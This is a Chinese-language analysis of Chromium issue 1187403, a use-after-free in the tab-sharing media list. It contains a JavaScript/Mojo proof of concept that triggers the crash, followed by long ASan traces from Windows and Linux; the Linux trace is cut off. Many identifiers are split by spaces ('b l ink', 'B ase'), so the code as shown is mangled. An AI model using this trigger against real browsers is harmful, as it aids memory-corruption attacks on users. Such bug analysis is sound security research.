chromium issue 1187403 分析
=========================

crash 复现
--------

### poc

[chromium issue 1187403](https://bugs.chromium.org/p/chromium/issues/detail?id=1187403) 中描述了一个 UAF 漏洞，PoC 如下：

```php
<html>
    <head>
        <script src="mojo_bindings.js"></script>
        <script src="/gen/third_party/b l ink/public/mojom/mediastream/media_stream.mojom.js"></script>
     </head>
     <body>
        <script>
            var media_stream = new b l ink.mojom.MediaStreamDispatcherHostPtr();
            Mojo.bindInterface(b l ink.mojom.MediaStreamDispatcherHost.name, mojo.makeRequest(media_stream).handle);
            var p0 = new b l ink.mojom.StreamControls();
            var p1 = new b l ink.mojom.TrackControls(); p1.requested = true; p1.streamType = 9; p1.deviceId = "";
            var p2 = new b l ink.mojom.TrackControls(); p2.requested = true; p2.streamType = 9; p2.deviceId = ""; p0.audio = p1; p0.video = p2; p0.hotwordEnabled = false; p0.disableLocalEcho = true; p0.requestPanTiltZoomPermission = false;
            var p3 = new b l ink.mojom.StreamSelectionInfo();
            var p4 = new mojoB ase.mojom.UnguessableToken(); p4.high= 7773416083151151597; p4.low = 1586930174894638458; p3.strategy = 2; p3.sessionId = p4; 
            media_stream.generateStream(111,p0,false,p3);

            setTimeout(()=>{window.close();},10000);
        </script>
    </body>
</html>
```

该段代码尝试分享当前页面上的内容，在 chrome 浏览器中会出现一个要求用户授权的弹出窗口，如下所示：

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-70664bdf2afd8326de2ba677f547f12433cb3599.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-70664bdf2afd8326de2ba677f547f12433cb3599.png)

当该窗口被关闭时，如果该窗口的重绘任务仍然在任务队列中时，该任务会被正常调度。而在相关类中存在该窗口的一个指针缓存，会对该指针进行解引用，从而产生 UAF。

### asan 报错

该 crash 在 windows 版和 linux 版的 chrome 中均可触发，在 861450 asan 版 chrome 报错如下。

#### windows

```asan
=================================================================
==100980==ERROR: AddressSanitizer: heap-use-after-free on address 0x128eee2b6180 at pc 0x7fff6bfe4b20 bp 0x00b52a7fe700 sp 0x00b52a7fe748
READ of size 8 at 0x128eee2b6180 thread T0
    #0 0x7fff6bfe4b1f in CurrentTabDesktopMediaList::Refresh(bool) C:\b\s\w\ir\cache\builder\src\chrome\browser\media\webrtc\current_tab_desktop_media_list.cc:123:10
    #1 0x7fff5f381ca7 in B ase::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\B ase\callback.h:102
    #2 0x7fff5f381ca7 in B ase::TaskAnnotator::RunTask(char const *, struct B ase::PendingTask *) C:\b\s\w\ir\cache\builder\src\B ase\task\common\task_annotator.cc:168:33
    #3 0x7fff61b18777 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class B ase::sequence_manager::LazyNow *) C:\b\s\w\ir\cache\builder\src\B ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:351:25
    #4 0x7fff61b17e59 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\b\s\w\ir\cache\builder\src\B ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:264:36
    #5 0x7fff5f4327a0 in B ase::MessagePumpForUI::DoRunLoop(void) C:\b\s\w\ir\cache\builder\src\B ase\message_loop\message_pump_win.cc:220:67
    #6 0x7fff5f4308e8 in B ase::MessagePumpWin::Run(class B ase::MessagePump::Delegate *) C:\b\s\w\ir\cache\builder\src\B ase\message_loop\message_pump_win.cc:78:3
    #7 0x7fff61b19d6f in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class B ase::TimeDelta) C:\b\s\w\ir\cache\builder\src\B ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:460:12
    #8 0x7fff5f303fa3 in B ase::RunLoop::Run(class B ase::Location const &) C:\b\s\w\ir\cache\builder\src\B ase\run_loop.cc:133:14
    #9 0x7fff61c403aa in ChromeBrowserMainParts::MainMessageLoopRun(int *) C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1742:15
    #10 0x7fff58c3d6fd in content::BrowserMainLoop::RunMainMessageLoopParts(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:978:29
    #11 0x7fff58c4303b in content::BrowserMainRunnerImpl::Run(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:150:15
    #12 0x7fff58c36c92 in content::BrowserMain(struct content::MainFunctionParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:47:28
    #13 0x7fff5f0b5ae4 in content::RunBrowserProcessMain(struct content::MainFunctionParams const &, class content::ContentMainDelegate *) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:582:10
    #14 0x7fff5f0b83dc in content::ContentMainRunnerImpl::RunBrowser(struct content::MainFunctionParams &, bool) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1067:10
    #15 0x7fff5f0b7679 in content::ContentMainRunnerImpl::Run(bool) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:945:12
    #16 0x7fff5f0b494f in content::RunContentProcess(struct content::ContentMainParams const &, class content::ContentMainRunner *) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:372:36
    #17 0x7fff5f0b4f4e in content::ContentMain(struct content::ContentMainParams const &) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:398:10
    #18 0x7fff5523145a in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:141:12
    #19 0x7ff7ace25bb5 in MainDllLoader::Launch(struct HINSTANCE__*, class B ase::TimeTicks) C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:169:12
    #20 0x7ff7ace22be6 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:370:20
    #21 0x7ff7ad20be5f in invoke_main d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #22 0x7ff7ad20be5f in __scrt_common_main_seh d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #23 0x7ff81be87033  (C:\WINDOWS\System32\KERNEL32.DLL+0x180017033)
    #24 0x7ff81c282650  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180052650)

0x128eee2b6180 is located 0 bytes inside of 1592-byte region [0x128eee2b6180,0x128eee2b67b8)
freed by thread T0 here:
    #0 0x7ff7acec441b in free C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:82    #1 0x7fff597d320d in content::RenderWidgetHostViewAura::`scalar deleting dtor'(unsigned int) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_widget_host_view_aura.h:1954
    #2 0x7fff608c3b53 in aura::Window::~Window(void) C:\b\s\w\ir\cache\builder\src\ui\aura\window.cc:164:16
    #3 0x7fff608d2c8b in aura::Window::`scalar deleting dtor'(unsigned int) C:\b\s\w\ir\cache\builder\src\ui\aura\window.cc:119:19
    #4 0x7fff59798c07 in content::RenderWidgetHostImpl::RendererExited(void) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_widget_host_impl.cc:2070:12
    #5 0x7fff5977934e in content::RenderViewHostImpl::RenderProcessExited(class content::RenderProcessHost *, struct content::ChildProcessTerminationInfo const &) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_view_host_impl.cc:678:16
    #6 0x7fff5974d3b3 in content::RenderProcessHostImpl::ProcessDied(bool, struct content::ChildProcessTerminationInfo *) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_process_host_impl.cc:4518:14
    #7 0x7fff5974cb0f in content::RenderProcessHostImpl::FastShutdownIfPossible(unsigned __int64, bool) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_process_host_impl.cc:3528:3
    #8 0x7fff639ea089 in TabStripModel::CloseWebContentses(class B ase::span<class content::WebContents *const, -1>, unsigned int, struct TabStripModel::DetachNotifications *) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:1810:19
    #9 0x7fff639da1f4 in TabStripModel::InternalCloseTabs(class B ase::span<class content::WebContents *const, -1>, unsigned int) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:1765:7
    #10 0x7fff639da8d9 in TabStripModel::CloseWebContentsAt(int, unsigned int) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\tabs\tab_strip_model.cc:727:10
    #11 0x7fff59aec301 in content::WebContentsImpl::Close(class content::RenderViewHost *) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:6910:16
    #12 0x7fff579f885c in b l ink::mojom::LocalMainF rameHostStubDispatch::Accept(class b l ink::mojom::LocalMainF rameHost *, class mojo::Message *) C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\b l ink\public\mojom\F rame\F rame.mojom.cc:16786:13
    #13 0x7fff5f7c17a6 in mojo::InterfaceEndpointClient::Handle ValidatedMessage(class mojo::Message *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:554:54
    #14 0x7fff61f56c11 in mojo::MessageDispatcher::Accept(class mojo::Message *) C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:48:24
    #15 0x7fff6271dcc0 in IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnProxyThread C:\b\s\w\ir\cache\builder\src\ipc\ipc_mojo_bootstrap.cc:945:24
    #16 0x7fff62717983 in B ase::internal::FunctorTraits<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),void>::Invoke C:\b\s\w\ir\cache\builder\src\B ase\bind_internal.h:498
    #17 0x7fff62717983 in B ase::internal::InvokeHelper<0,void>::MakeItSo C:\b\s\w\ir\cache\builder\src\B ase\bind_internal.h:637
    #18 0x7fff62717983 in B ase::internal::Invoker<B ase::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\B ase\bind_internal.h:710
    #19 0x7fff62717983 in B ase::internal::Invoker<B ase::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\B ase\bind_internal.h:679:12
    #20 0x7fff5f381ca7 in B ase::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\B ase\callback.h:102
    #21 0x7fff5f381ca7 in B ase::TaskAnnotator::RunTask(char const *, struct B ase::PendingTask *) C:\b\s\w\ir\cache\builder\src\B ase\task\common\task_annotator.cc:168:33
    #22 0x7fff61b18777 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class B ase::sequence_manager::LazyNow *) C:\b\s\w\ir\cache\builder\src\B ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:351:25
    #23 0x7fff61b17e59 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\b\s\w\ir\cache\builder\src\B ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:264:36
    #24 0x7fff5f4327a0 in B ase::MessagePumpForUI::DoRunLoop(void) C:\b\s\w\ir\cache\builder\src\B ase\message_loop\message_pump_win.cc:220:67
    #25 0x7fff5f4308e8 in B ase::MessagePumpWin::Run(class B ase::MessagePump::Delegate *) C:\b\s\w\ir\cache\builder\src\B ase\message_loop\message_pump_win.cc:78:3
    #26 0x7fff61b19d6f in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class B ase::TimeDelta) C:\b\s\w\ir\cache\builder\src\B ase\task\sequence_manager\thread_controller_with_message_pump_impl.cc:460:12
    #27 0x7fff5f303fa3 in B ase::RunLoop::Run(class B ase::Location const &) C:\b\s\w\ir\cache\builder\src\B ase\run_loop.cc:133:14
    #28 0x7fff61c403aa in ChromeBrowserMainParts::MainMessageLoopRun(int *) C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1742:15
    #29 0x7fff58c3d6fd in content::BrowserMainLoop::RunMainMessageLoopParts(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:978:29
    #30 0x7fff58c4303b in content::BrowserMainRunnerImpl::Run(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:150:15
    #31 0x7fff58c36c92 in content::BrowserMain(struct content::MainFunctionParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:47:28
    #32 0x7fff5f0b5ae4 in content::RunBrowserProcessMain(struct content::MainFunctionParams const &, class content::ContentMainDelegate *) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:582:10

previously allocated by thread T0 here:
    #0 0x7ff7acec451b in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:98
    #1 0x7fff7168114a in operator new(unsigned __int64) d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:35
    #2 0x7fff59b11bfb in content::WebContentsViewAura::CreateViewForWidget(class content::RenderWidgetHost *) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_view_aura.cc:945:13
    #3 0x7fff59af7936 in content::WebContentsImpl::CreateRenderWidgetHostViewForRenderManager(class content::RenderViewHost *) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:7631:14
    #4 0x7fff59af7dcb in content::WebContentsImpl::CreateRenderViewForRenderManager(class content::RenderViewHost *, class B ase::Optional<class b l ink::MultiToken<class util::TokenType<class b l ink::LocalF rameTokenTypeMarker>, class util::TokenType<class b l ink::RemoteF rameTokenTypeMarker>>> const &, class content::RenderF rameProxyHost *) C:\b\s\w\ir\cache\builder\src\content\browser\web_contents\web_contents_impl.cc:7654:5
    #5 0x7fff59714907 in content::RenderF rameHostManager::InitRenderView(class content::SiteInstance *, class content::RenderViewHostImpl *, class content::RenderF rameProxyHost *) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_F rame_host_manager.cc:2688:29
    #6 0x7fff5970c3b7 in content::RenderF rameHostManager::ReinitializeMainRenderF rame(class content::RenderF rameHostImpl *) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_F rame_host_manager.cc:2905:8
    #7 0x7fff5970a5b1 in content::RenderF rameHostManager::GetF rameHostForNavigation(class content::NavigationRequest *, class std::__1::basic_string<char, struct std::__1::char_traits<char>, class std::__1::allocator<char>> *) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_F rame_host_manager.cc:948:10
    #8 0x7fff597097e0 in content::RenderF rameHostManager::DidCreateNavigationRequest(class content::NavigationRequest *) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\render_F rame_host_manager.cc:722:37
    #9 0x7fff5948f4f4 in content::F rameTreeNode::CreatedNavigationRequest(class std::__1::unique_ptr<class content::NavigationRequest, struct std::__1::default_delete<class content::NavigationRequest>>) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\F rame_tree_node.cc:517:21
    #10 0x7fff5964a1c1 in content::Navigator::Navigate(class std::__1::unique_ptr<class content::NavigationRequest, struct std::__1::default_delete<class content::NavigationRequest>>, enum content::ReloadType) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\navigator.cc:540:20
    #11 0x7fff595c6290 in content::NavigationControllerImpl::NavigateWithoutEntry(struct content::NavigationController::LoadURLParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\navigation_controller_impl.cc:3168:21    #12 0x7fff595c547f in content::NavigationControllerImpl::LoadURLWithParams(struct content::NavigationController::LoadURLParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\renderer_host\navigation_controller_impl.cc:1042:3
[89408:11988:0702/113556.407:ERROR:gpu_init.cc(430)] Passthrough is not supported, GL is disabled
    #13 0x7fff6165a651 in `anonymous namespace'::LoadURLInContents C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\browser_navigator.cc:385:36
    #14 0x7fff61657c58 in Navigate(struct NavigateParams *) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\browser_navigator.cc:660:7
    #15 0x7fff68b60421 in StartupBrowserCreatorImpl::OpenTabsInBrowser(class Browser *, bool, class std::__1::vector<struct StartupTab, class std::__1::allocator<struct StartupTab>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:273:5
    #16 0x7fff68b62134 in StartupBrowserCreatorImpl::RestoreOrCreateBrowser(class std::__1::vector<struct StartupTab, class std::__1::allocator<struct StartupTab>> const &, enum StartupBrowserCreatorImpl::BrowserOpenBehavior, unsigned int, bool, bool) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:521:13
    #17 0x7fff68b5f693 in StartupBrowserCreatorImpl::DetermineURLsAndLaunch(bool, class std::__1::vector<class GURL, class std::__1::allocator<class GURL>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:385:22
    #18 0x7fff68b5ecf2 in StartupBrowserCreatorImpl::Launch(class Profile *, class std::__1::vector<class GURL, class std::__1::allocator<class GURL>> const &, bool, class std::__1::unique_ptr<class LaunchModeRecorder, struct std::__1::default_delete<class LaunchModeRecorder>>) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:186:3
    #19 0x7fff64ae0fd0 in StartupBrowserCreator::LaunchBrowser(class B ase::CommandLine const &, class Profile *, class B ase::FilePath const &, enum chrome::startup::IsProcessStartup, enum chrome::startup::IsFirstRun, class std::__1::unique_ptr<class LaunchModeRecorder, struct std::__1::default_delete<class LaunchModeRecorder>>) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:573:13
    #20 0x7fff64ae68d9 in StartupBrowserCreator::LaunchBrowserForLastProfiles(class B ase::CommandLine const &, class B ase::FilePath const &, bool, class Profile *, class std::__1::vector<class Profile *, class std::__1::allocator<class Profile *>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:1056:14
    #21 0x7fff64ae06ae in StartupBrowserCreator::ProcessCmdLineImpl(class B ase::CommandLine const &, class B ase::FilePath const &, bool, class Profile *, class std::__1::vector<class Profile *, class std::__1::allocator<class Profile *>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:984:10
    #22 0x7fff64adedb1 in StartupBrowserCreator::Start(class B ase::CommandLine const &, class B ase::FilePath const &, class Profile *, class std::__1::vector<class Profile *, class std::__1::allocator<class Profile *>> const &) C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:525:10
    #23 0x7fff61c3db13 in ChromeBrowserMainParts::PreMainMessageLoopRunImpl(void) C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1648:25
    #24 0x7fff61c3b534 in ChromeBrowserMainParts::PreMainMessageLoopRun(void) C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1043:18
    #25 0x7fff58c3d480 in content::BrowserMainLoop::PreMainMessageLoopRun(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:952:13
    #26 0x7fff599ed9f9 in B ase::OnceCallback<int ()>::Run C:\b\s\w\ir\cache\builder\src\B ase\callback.h:102
    #27 0x7fff599ed9f9 in content::StartupTaskRunner::RunAllTasksNow(void) C:\b\s\w\ir\cache\builder\src\content\browser\startup_task_runner.cc:41:29
    #28 0x7fff58c3a75e in content::BrowserMainLoop::CreateStartupTasks(void) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:862:25
    #29 0x7fff58c424f8 in content::BrowserMainRunnerImpl::Initialize(struct content::MainFunctionParams const &) C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:129:15

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\chrome\browser\media\webrtc\current_tab_desktop_media_list.cc:123:10 in CurrentTabDesktopMediaList::Refresh(bool)
Shadow bytes around the buggy address:
  0x04aacbe56be0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56bf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56c00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56c10: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x04aacbe56c20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x04aacbe56c30:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56c40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56c50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56c60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56c70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x04aacbe56c80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra o bject redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==100980==ABORTING
```

#### linux

```asan
=================================================================
==188105==ERROR: AddressSanitizer: heap-use-after-free on address 0x61b000106180 at pc 0x55944dcee06b bp 0x7ffeed379930 sp 0x7ffeed379928
READ of size 8 at 0x61b000106180 thread T0 (chrome)
[188138:188170:0702/112523.822342:ERROR:ssl_client_socket_impl.cc(947)] handshake failed; returned -1, SSL error code 1, net_error -101
[188138:188170:0702/112523.822563:ERROR:ssl_client_socket_impl.cc(947)] handshake failed; returned -1, SSL error code 1, net_error -101
[188138:188170:0702/112523.825226:ERROR:ssl_client_socket_impl.cc(947)] handshake failed; returned -1, SSL error code 1, net_error -101
    #0 0x55944dcee06a in CurrentTabDesktopMediaList::Refresh(bool) chrome/browser/media/webrtc/current_tab_desktop_media_list.cc:123:10
    #1 0x55944dceb728 in Invoke<void (DesktopMediaListB ase::*)(bool), B ase::WeakPtr<DesktopMediaListB ase>, bool> B ase/bind_internal.h:498:12
    #2 0x55944dceb728 in MakeItSo<void (DesktopMediaListB ase::*)(bool), B ase::WeakPtr<DesktopMediaListB ase>, bool> B ase/bind_internal.h:657:5
    #3 0x55944dceb728 in RunImpl<void (DesktopMediaListB ase::*)(bool), std::tuple<B ase::WeakPtr<DesktopMediaListB ase>, bool>, 0, 1> B ase/bind_internal.h:710:12
    #4 0x55944dceb728 in B ase::internal::Invoker<B ase::internal::BindState<void (DesktopMediaListB ase::*)(bool), B ase::WeakPtr<DesktopMediaListB ase>, bool>, void ()>::RunOnce(B ase::internal::BindStateB ase*) B ase/bind_internal.h:679:12
    #5 0x55944c9aeae6 in Run B ase/callback.h:101:12
    #6 0x55944c9aeae6 in B ase::TaskAnnotator::RunTask(char const*, B ase::PendingTask*) B ase/task/common/task_annotator.cc:168:33
    #7 0x55944c9ea307 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(B ase::sequence_manager::LazyNow*) B ase/task/sequence_manager/thread_controller_with_message_pump_impl.cc:351:25
    #8 0x55944c9e9b34 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() B ase/task/sequence_manager/thread_controller_with_message_pump_impl.cc:264:36
    #9 0x55944c8ac699 in HandleDispatch B ase/message_loop/message_pump_glib.cc:374:46
    #10 0x55944c8ac699 in B ase::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) B ase/message_loop/message_pump_glib.cc:124:43
    #11 0x7f5f672dce6a in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x51e6a)

0x61b000106180 is located 0 bytes inside of 1560-byte region [0x61b000106180,0x61b000106798)
freed by thread T0 (chrome) here:
    #0 0x5594401d064d in operator delete(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:160:3
    #1 0x559452359099 in aura::Window::~Window() ui/aura/window.cc:164:16
    #2 0x55945235aa0d in aura::Window::~Window() ui/aura/window.cc:119:19
    #3 0x559445d59589 in content::RenderWidgetHostImpl::RendererExited() content/browser/renderer_host/render_widget_host_impl.cc:2070:12
    #4 0x559445d309a9 in RenderProcessExited content/browser/renderer_host/render_view_host_impl.cc:678:16
    #5 0x559445d309a9 in non-virtual thunk to content::RenderViewHostImpl::RenderProcessExited(content::RenderProcessHost*, content::ChildProcessTerminationInfo const&) content/browser/renderer_host/render_view_host_impl.cc
    #6 0x559445ce3560 in content::RenderProcessHostImpl::ProcessDied(bool, content::ChildProcessTerminationInfo*) content/browser/renderer_host/render_process_host_impl.cc:4518:14
    #7 0x559445ce2a22 in content::RenderProcessHostImpl::FastShutdownIfPossible(unsigned long, bool) content/browser/renderer_host/render_process_host_impl.cc:3528:3
    #8 0x559457b53853 in TabStripModel::CloseWebContentses(B ase::span<content::WebContents* const, 18446744073709551615ul>, unsigned int, TabStripModel::DetachNotifications*) chrome/browser/ui/tabs/tab_strip_model.cc:1810:19
    #9 0x559457b3f06f in TabStripModel::InternalCloseTabs(B ase::span<content::WebContents* const, 18446744073709551615ul>, unsigned int) chrome/browser/ui/tabs/tab_strip_model.cc:1765:7
    #10 0x559457b3f881 in TabStripModel::CloseWebContentsAt(int, unsigned int) chrome/browser/ui/tabs/tab_strip_model.cc:727:10
    #11 0x55944617f9bf in Close content/browser/web_contents/web_contents_impl.cc:6910:16
    #12 0x55944617f9bf in non-virtual thunk to content::WebContentsImpl::Close(content::RenderViewHost*) content/browser/web_contents/web_contents_impl.cc
    #13 0x559442ddf8bf in b l ink::mojom::LocalMainF rameHostStubDispatch::Accept(b l ink::mojom::LocalMainF rameHost*, mojo::Message*) gen/third_party/b l ink/public/mojom/F rame/F rame.mojom.cc:16786:13
    #14 0x55944e375d0a in mojo::InterfaceEndpointClient::Handle ValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:554:54
    #15 0x55944e381b5a in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:48:24
    #16 0x55944fcd6b89 in IPC::(anonymous namespace)::ChannelAssociatedGroupController::AcceptOnProxyThread(mojo::Message) ipc/ipc_mojo_bootstrap.cc:945:24
    #17 0x55944fccf464 in Invoke<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message> B ase/bind_internal.h:498:12
    #18 0x55944fccf464 in MakeItSo<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message> B ase/bind_internal.h:637:12
    #19 0x55944fccf464 in RunImpl<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), std::tuple<scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message>, 0, 1> B ase/bind_internal.h:710:12
    #20 0x55944fccf464 in B ase::internal::Invoker<B ase::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message), scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>, mojo::Message>, void ()>::RunOnce(B ase::internal::BindStateB ase*) B ase/bind_internal.h:679:12
    #21 0x55944c9aeae6 in Run B ase/callback.h:101:12
    #22 0x55944c9aeae6 in B ase::TaskAnnotator::RunTask(char const*, B ase::PendingTask*) B ase/task/common/task_annotator.cc:168:33
    #23 0x55944c9ea307 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(B ase::sequence_manager::LazyNow*) B ase/task/sequence_manager/thread_controller_with_message_pump_impl.cc:351:25
    #24 0x55944c9e9b34 in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() B ase/task/sequence_manager/thread_controller_with_message_pump_impl.cc:264:36
    #25 0x55944c8ab920 in B ase::MessagePumpGlib::Run(B ase::MessagePump::Delegate*) B ase/message_loop/message_pump_glib.cc:404:48
    #26 0x55944c9eb42c in B ase::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, B ase::TimeDelta) B ase/task/sequence_manager/thread_controller_with_message_pump_impl.cc:460:12
    #27 0x55944c92b301 in B ase::RunLoop::Run(B ase::Location const&) B ase/run_loop.cc:133:14
    #28 0x55944d407e48 in ChromeBrowserMainParts::MainMessageLoopRun(int*) chrome/browser/chrome_browser_main.cc:1742:15
    #29 0x559445002040 in content::BrowserMainLoop::RunMainMessageLoopParts() content/browser/browser_main_loop.cc:978:29
    #30 0x559445006ec5 in content::BrowserMainRunnerImpl::Run() content/browser/browser_main_runner_impl.cc:150:15
    #31 0x559444ffb385 in content::BrowserMain(content::MainFunctionParams const&) content/browser/browser_main.cc:47:28
    #32 0x55944c688845 in RunBrowserProcessMain content/app/content_main_runner_impl.cc:582:10
